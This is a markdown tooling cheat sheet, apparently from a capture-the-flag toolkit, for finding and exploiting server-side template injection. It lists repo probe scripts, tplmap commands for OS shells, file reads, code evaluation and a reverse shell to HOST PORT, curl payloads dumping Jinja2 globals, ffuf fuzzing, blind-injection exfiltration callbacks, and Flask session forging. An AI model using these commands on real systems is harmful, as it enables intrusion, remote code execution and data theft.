# Tooling — repo primitives + external for SSTI

---

## Repo tools

| Tool | Job in SSTI |
|---|---|
| `tools/web/ssti_probe.py` | the operational probe — fires engine-fingerprint payloads at the param, baseline-diffs, reports the engine signal — run FIRST |
| `tools/web/http_probe.py` | request+response pair in the evidence shape `hooks.py` wants — emits the whole `post-probe` command with `--response` filled |
| `tools/web/variant_matrix.py` | one payload per SHAPE across injection families — `{{}}`,`${}`,`<%=%>` shapes in one pass — which syntax evaluates |
| `tools/web/sanitizer_fuzz.py` | encoding sweep when a filter blocks your payload — which encodings survive — records negatives |
| `tools/web/read_loop.py` | file-path walk once a file-read sink is proven |
| `tools/web/oob_listener.py` | HTTP/DNS listener for blind-SSTI exfil callbacks |
| `tools/web/pdf_text.py` | text out of a rendered PDF — artifact-render reads |
| `tools/web/session_dissect.py` | SECRET_KEY leaked → forge the flask session |

### ssti_probe usage
```bash
python3 tools/web/ssti_probe.py --url URL --param name \
    [--method GET|POST] [--body "f={M}"] [--headers "K:V;..."]
```
`{M}` marks the injectable position in `--body`.

### http_probe for evidence
```bash
python3 tools/web/http_probe.py --url 'http://t/?name={{7*7}}' \
    --challenge <name> [--method POST --body 'name={payload}'] \
    [--header 'K:V'] [--evidence-contains '49']
```
emits the response AND the `hooks.py post-probe` command —
`confirms` only fires on the marker (49) inside the response.

### variant_matrix — the shape-sweep
```bash
python3 tools/web/variant_matrix.py --url URL --param name \
    --dry-run        # print the matrix, send nothing
python3 tools/web/variant_matrix.py --url URL --param name
```
SSTI shapes fire alongside sqli/xss/etc — the report says WHICH
shape-family produced a delta — `{{7*7}}`→49 is the SSTI row.

### sanitizer_fuzz — when filtered
```bash
python3 tools/web/sanitizer_fuzz.py --url 'http://t/?name={payload}' \
    --forbidden '__class__' [--forbidden '__globals__'] \
    [--field name] [--urlencode]
```
`{payload}` marks the injectable slot in `--url`/`--template`;
each `--forbidden` token gets a differential encoding sweep —
reports which encodings survive.

## External tools

### tplmap — the SSTI scanner (absent here but worth knowing)
```bash
tplmap -u 'http://t/?name=x' -d 'name=x'   # detect+exploit
tplmap -u URL --os-shell                    # exec channel
tplmap -u URL --os-cmd 'cat /flag'
tplmap -u URL --download /flag out.txt
tplmap -u URL --engine jinja2               # force engine
tplmap -u URL --level 5 --technique R      # R=rendered T=time
tplmap -u URL --eval-code 'python code'    # python direct
tplmap -u URL --reverse-shell HOST PORT
```
If tplmap is present it automates the whole pipeline — but learn
the manual chains anyway; CTF environments block it or it's
absent.

### curl one-liners
```bash
curl 'http://t/?name=%7B%7B7*7%7D%7D'           # {{7*7}} encoded
curl 'http://t/?name=%7B%7Bconfig%7D%7D'
curl 'http://t/?name=%7B%7Blipsum.__globals__%7D%7D'
curl 'http://t/?name=%7B%7Bself.__init__.__globals__%7D%7D'
curl --data-urlencode 'name={{7*7}}' http://t/   # POST encoded
curl --data-urlencode 't={{lipsum.__globals__}}' http://t/
```

### ffuf — engine/param fuzz
```bash
ffuf -u 'http://t/?name=FUZZ' -w payloads.txt -mr '49'
ffuf -u 'http://t/FUZZ' -w engines.txt -mr '49'
   — find WHICH param/path is the render-point — -mr on the
     arithmetic result
```

## The evidence discipline

Every confirming probe → `http_probe` → the emitted `post-probe`
command → `hooks.py` records it. The SSTI-confirm marker is the
arithmetic result: `49` inside the response with your unique
surrounding text is the verbatim excerpt.
